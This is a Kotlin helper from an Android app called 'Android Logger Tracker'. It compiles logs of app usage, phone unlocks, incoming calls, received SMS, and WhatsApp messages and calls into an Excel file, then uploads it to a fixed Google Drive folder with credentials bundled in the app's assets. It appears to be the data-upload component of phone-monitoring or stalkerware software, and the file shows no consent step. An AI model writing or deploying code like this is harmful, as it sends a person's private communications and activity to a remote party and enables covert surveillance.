package com.logger.utils

import android.content.Context
import com.google.api.client.googleapis.javanet.GoogleNetHttpTransport
import com.google.api.client.http.FileContent
import com.google.api.client.json.gson.GsonFactory
import com.google.api.services.drive.Drive
import com.google.api.services.drive.DriveScopes
import com.google.auth.http.HttpCredentialsAdapter
import com.google.auth.oauth2.GoogleCredentials
import com.logger.data.LogEntry
import jxl.Workbook
import jxl.write.Label
import jxl.write.WritableWorkbook
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object GoogleDriveHelper {

    private const val FOLDER_ID = "1rSToL1_lxoBHYhkZF2REZUwu7bOXCIoU"

    suspend fun buildExcelFile(file: File, logs: List<LogEntry>) = withContext(Dispatchers.IO) {
        val outputStream = FileOutputStream(file)
        val workbook = Workbook.createWorkbook(outputStream)
                        
        val appLogs = logs.filter { it.eventType == LogEntry.TYPE_APP_OPENED || it.eventType == LogEntry.TYPE_APP_CLOSED || it.eventType == LogEntry.TYPE_APP_FOCUS || it.eventType == LogEntry.TYPE_AUTH_UNLOCK }
        val callLogs = logs.filter { it.eventType == LogEntry.TYPE_CALL_INCOMING }
        val msgLogs = logs.filter { it.eventType == LogEntry.TYPE_SMS_RECEIVED }
        val waLogs = logs.filter { it.eventType == LogEntry.TYPE_WHATSAPP_MSG || it.eventType == LogEntry.TYPE_WHATSAPP_CALL }
                        
        writeSheet(workbook, "App Activity", 0, appLogs)
        writeSheet(workbook, "Calls", 1, callLogs)
        writeSheet(workbook, "Messages", 2, msgLogs)
        writeSheet(workbook, "WhatsApp", 3, waLogs)
                        
        workbook.write()
        workbook.close()
        outputStream.close()
    }
    
    private fun writeSheet(workbook: WritableWorkbook, name: String, index: Int, logs: List<LogEntry>) {
        val sheet = workbook.createSheet(name, index)
        val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
        
        sheet.addCell(Label(0, 0, "Time"))
        sheet.addCell(Label(1, 0, "Event Type"))
        sheet.addCell(Label(2, 0, "Details"))
        sheet.addCell(Label(3, 0, "App / Content"))
        sheet.addCell(Label(4, 0, "Duration (ms)"))
        
        for (i in logs.indices) {
            val log = logs[i]
            val row = i + 1
            sheet.addCell(Label(0, row, sdf.format(Date(log.timestamp))))
            sheet.addCell(Label(1, row, log.eventType))
            sheet.addCell(Label(2, row, log.details ?: ""))
            sheet.addCell(Label(3, row, log.appName ?: ""))
            sheet.addCell(Label(4, row, log.durationMillis?.toString() ?: ""))
        }
    }

    suspend fun uploadToGoogleDrive(context: Context, file: File, remoteFileName: String) = withContext(Dispatchers.IO) {
        context.assets.open("credentials.json").use { inputStream ->
            val credentials = GoogleCredentials.fromStream(inputStream)
                .createScoped(listOf(DriveScopes.DRIVE_FILE))
                
            val httpTransport = GoogleNetHttpTransport.newTrustedTransport()
            val jsonFactory = GsonFactory.getDefaultInstance()
            
            val driveService = Drive.Builder(httpTransport, jsonFactory, HttpCredentialsAdapter(credentials))
                .setApplicationName("Android Logger Tracker")
                .build()
                
            val fileMetadata = com.google.api.services.drive.model.File().apply {
                name = remoteFileName
                parents = listOf(FOLDER_ID)
                mimeType = "application/vnd.ms-excel"
            }
            
            val mediaContent = FileContent("application/vnd.ms-excel", file)
            
            driveService.files().create(fileMetadata, mediaContent)
                .setFields("id")
                .execute()
        }
    }
}
